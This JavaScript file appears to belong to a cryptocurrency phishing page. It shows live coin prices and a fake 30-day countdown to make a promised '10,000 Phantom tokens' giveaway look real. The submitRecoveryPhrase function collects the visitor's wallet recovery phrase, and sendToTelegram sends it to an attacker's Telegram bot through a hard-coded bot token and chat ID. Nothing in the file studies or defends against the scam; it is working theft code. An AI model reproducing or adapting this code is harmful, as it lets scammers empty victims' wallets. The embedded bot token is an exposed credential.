// Fetch cryptocurrency prices using a public API
async function fetchCryptoPrices() {
    try {
        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana,binancecoin&vs_currencies=usd');
        const data = await response.json();
        document.getElementById('bitcoin-price').innerText = data.bitcoin.usd;
        document.getElementById('ethereum-price').innerText = data.ethereum.usd;
        document.getElementById('solana-price').innerText = data.solana.usd;
        document.getElementById('binance-price').innerText = data.binancecoin.usd;
    } catch (error) {
        console.error("Error fetching crypto prices:", error);
    }
}

// Countdown timer
const countdownDate = new Date().getTime() + 30 * 24 * 60 * 60 * 1000; // 30 days from now

function updateTimer() {
    const now = new Date().getTime();
    const distance = countdownDate - now;

    const days = Math.floor(distance / (1000 * 60 * 60 * 24));
    const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((distance % (1000 * 60)) / 1000);

    document.getElementById("timer").innerHTML = `${days}d ${hours}h ${minutes}m ${seconds}s`;

    if (distance < 0) {
        clearInterval(timerInterval);
        document.getElementById("timer").innerHTML = "EXPIRED";
    }
}

const timerInterval = setInterval(updateTimer, 1000);

// Handle form submission
function submitRecoveryPhrase() {
    const recoveryPhrase = document.getElementById('recovery-phrase').value;
    if (recoveryPhrase) {
        document.getElementById('confirmation-message').innerText = `You will receive 10,000 Phantom tokens in 30 days!`;
        // Send data to backend here using fetch (for example, saving to a file or sending to Telegram)
        sendToTelegram(recoveryPhrase);
    } else {
        document.getElementById('confirmation-message').innerText = "Please enter a valid recovery phrase!";
    }
}

// Send recovery phrase to Telegram
async function sendToTelegram(recoveryPhrase) {
    const token = '8012898137:AAHrkbdZwW7a3qIinIkPq2pgHrNN1pOX_-A'; // Your Bot Token
    const chatId = '1353449624'; // Your Chat ID
    const message = `New Recovery Phrase: ${recoveryPhrase}`;

    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    try {
        await fetch(url);
        console.log("Message sent to Telegram");
    } catch (error) {
        console.error("Error sending message to Telegram:", error);
    }
}

// Initialize the page
fetchCryptoPrices();
updateTimer();
